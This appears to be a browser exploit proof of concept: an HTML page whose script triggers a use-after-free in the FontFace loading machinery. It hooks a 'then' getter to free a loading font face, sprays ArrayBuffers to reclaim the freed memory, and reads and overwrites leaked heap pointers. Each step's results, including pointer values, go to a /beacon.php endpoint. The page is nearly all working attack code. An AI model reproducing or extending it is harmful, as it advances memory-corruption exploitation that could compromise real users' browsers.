<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P787 — Dual-FontFace Loading Oracle & Q11 Dereference Probe</title>
<style>
  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
  h2 { color: #58a6ff; margin-top: 0; }
  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
</style>
<script>
'use strict';
window.onerror = function(msg, url, line, col, err){
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P787-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
    x.send(null);
  } catch(e){}
};

function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function b(tag, data){
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P787-' + encodeURIComponent(tag) +
      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
    x.send(null);
  } catch(e){}
}

var OUT = null;
function log(s){
  if (!OUT) OUT = document.getElementById('out');
  if (OUT) OUT.textContent += s + '\n';
}

var P58 = 0n, P68 = 0n;
var BUF_B = null, VIEW_B = null;
var FACE_TRIGGER = null;
var FACE_VICTIM = null;

function run(){
  OUT = document.getElementById('out');
  log('=== P787 Dual-FontFace Loading Oracle & Q11 Dereference Probe ===\n');
  b('BOOT', 'start');

  setupAndTriggerUAF();
}

function setupAndTriggerUAF(){
  b('STEP1-SETUP', 'start');

  // 1. CSS Font with url(/hang.php) covering 'B' (U+0042)
  var stHang = document.createElement('style');
  var hangUrl = '/hang.php?nocache=' + Date.now() + '_csshang';
  stHang.textContent = '@font-face{font-family:cssHangFam;src:url(' + hangUrl + ');unicode-range:U+0042;}';
  document.head.appendChild(stHang);

  // 2. JS Victim FontFace with url(/hang.php) covering 'A' (U+0041)
  var vicUrl = '/hang.php?nocache=' + Date.now() + '_vic';
  FACE_VICTIM = new FontFace('vicHangFam', 'url(' + vicUrl + ')', { unicodeRange: 'U+0041' });
  document.fonts.add(FACE_VICTIM);
  FACE_VICTIM.load().catch(function(){});

  // 3. JS Trigger FontFace (LOCAL - loads synchronously to fire .then immediately!)
  FACE_TRIGGER = new FontFace('trigFam', 'local(Helvetica)', { unicodeRange: 'U+0054' });
  document.fonts.add(FACE_TRIGGER);
  void FACE_TRIGGER.loaded;

  log('Setup complete:');
  log('  FACE_TRIGGER: trigFam (local)');
  log('  FACE_VICTIM: vicHangFam (loading, U+0041)');
  log('  stHang: cssHangFam (loading, U+0042)');
  log('  FACE_VICTIM.status = ' + FACE_VICTIM.status);

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired) return undefined;
      fired = true;

      b('THEN-FIRED', 'victimStatus=' + FACE_VICTIM.status);

      // Free both candidates
      if (stHang){ stHang.remove(); stHang.textContent = ''; stHang = null; }
      try { document.fonts.delete(FACE_VICTIM); } catch(e){}
      document.body.offsetHeight;

      // Spray 64 ArrayBuffers (192B) to reclaim freed CSSFontFace slot
      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));

      // Force style resolution on trigFam
      try { document.fonts.check('1em trigFam'); } catch(e){}
      document.body.offsetHeight;

      return undefined;
    },
    set: function(){}
  });

  // Trigger: Only request the LOCAL trigger font so load finishes synchronously!
  b('STEP2-LOAD', 'trigFam');
  document.fonts.load('1em trigFam', 'T');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for (var i = 0; i < abs.length; i++){
      var u = new Uint8Array(abs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }

    if (best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'bestNz=' + bestNz);
      log('Reclaim missed: bestNz=' + bestNz);
      return;
    }

    BUF_B = abs[best];
    VIEW_B = new BigUint64Array(BUF_B);
    P58 = VIEW_B[11]; // q11: m_ranges.m_buffer
    P68 = VIEW_B[13]; // q13: m_sources.m_buffer

    var q0 = VIEW_B[0];
    var q11 = VIEW_B[11];
    var q12 = VIEW_B[12];
    var q13 = VIEW_B[13];

    b('RECLAIM-HIT', 'k=' + best + '|nz=' + bestNz + '|q0=0x' + h16(q0) +
      '|p58=0x' + h16(P58) + '|q12=0x' + h16(q12) + '|p68=0x' + h16(P68));
    log('Reclaim HIT: k=' + best + ' nz=' + bestNz);
    log('  q0=0x' + h16(q0) + ' q11(p58)=0x' + h16(P58) + ' q12=0x' + h16(q12) + ' q13(p68)=0x' + h16(P68));

    // Proceed to Step 3: Test Oracle & Re-Add
    testOracleAndDereference();
  }, 250);
}

function testOracleAndDereference(){
  log('\n=== Step 3: Loading Oracle & Re-Add Tests ===');

  // Test 3.1: Check state of FACE_VICTIM before re-add
  var preHas = document.fonts.has(FACE_VICTIM);
  var preStatus = FACE_VICTIM.status;
  var preChkA = document.fonts.check('1em vicHangFam', 'A'); // was U+0041
  var preChkB = document.fonts.check('1em vicHangFam', 'B'); // out of range
  b('T31-PRE-ADD', 'has=' + preHas + '|status=' + preStatus + '|chkA=' + preChkA + '|chkB=' + preChkB);
  log('Pre-add: has=' + preHas + ' status=' + preStatus + ' chkA=' + preChkA + ' chkB=' + preChkB);

  // Test 3.2: Re-add FACE_VICTIM to document.fonts
  var addErr = 'none';
  try {
    document.fonts.add(FACE_VICTIM);
  } catch(e){
    addErr = e.name + ':' + e.message;
  }
  var postHas = document.fonts.has(FACE_VICTIM);
  var postStatus = FACE_VICTIM.status;

  // Test 3.3: Check after re-add (UNMODIFIED q11)
  var postChkA = document.fonts.check('1em vicHangFam', 'A'); // in-range (U+0041)
  var postChkB = document.fonts.check('1em vicHangFam', 'B'); // out-of-range (U+0042)
  var postChkC = document.fonts.check('1em vicHangFam', 'C'); // out-of-range (U+0043)
  var postChkSpace = document.fonts.check('1em vicHangFam', ' ');

  b('T32-POST-ADD', 'addErr=' + addErr + '|has=' + postHas + '|status=' + postStatus +
    '|chkA=' + postChkA + '|chkB=' + postChkB + '|chkC=' + postChkC + '|chkSpace=' + postChkSpace);
  log('Post-add: has=' + postHas + ' status=' + postStatus);
  log('  chkA(U+0041, in-range) = ' + postChkA + ' (expected: false if oracle reads ranges)');
  log('  chkB(U+0042, out-range) = ' + postChkB + ' (expected: true)');
  log('  chkC(U+0043, out-range) = ' + postChkC + ' (expected: true)');

  // Test 3.4: Also check cssHangFam
  var cssChkA = document.fonts.check('1em cssHangFam', 'A');
  var cssChkB = document.fonts.check('1em cssHangFam', 'B');
  b('T33-CSS-HANG', 'cssA=' + cssChkA + '|cssB=' + cssChkB);
  log('cssHangFam: A=' + cssChkA + ' B=' + cssChkB);

  // Test 4: Mutate q11 in VIEW_B (DEREFERENCE TEST)
  log('\n=== Step 4: Dereference & Range Mutation Test ===');
  var origQ11 = VIEW_B[11];
  var origQ12 = VIEW_B[12];

  // Zero q11
  VIEW_B[11] = 0n;
  var zeroChkA = document.fonts.check('1em vicHangFam', 'A');
  var zeroChkB = document.fonts.check('1em vicHangFam', 'B');
  b('T41-ZERO-Q11', 'origQ11=0x' + h16(origQ11) + '|chkA=' + zeroChkA + '|chkB=' + zeroChkB);
  log('q11=0x0: chkA=' + zeroChkA + ' chkB=' + zeroChkB);

  // Restore q11
  VIEW_B[11] = origQ11;
  VIEW_B[12] = origQ12;
  b('T42-RESTORED', 'q11=0x' + h16(VIEW_B[11]));
  log('q11 restored: 0x' + h16(VIEW_B[11]));

  b('DONE', 'probe-complete');
  log('\n=== P787 COMPLETE ===');
}

if (document.readyState === 'complete' || document.readyState === 'interactive') {
  setTimeout(run, 0);
} else {
  document.addEventListener('DOMContentLoaded', run);
}
</script>
</head>
<body>
  <h2>P787 — Dual-FontFace Loading Oracle & Q11 Dereference Probe</h2>
  <div id="status" class="status">Running probe...</div>
  <pre id="out"></pre>
</body>
</html>
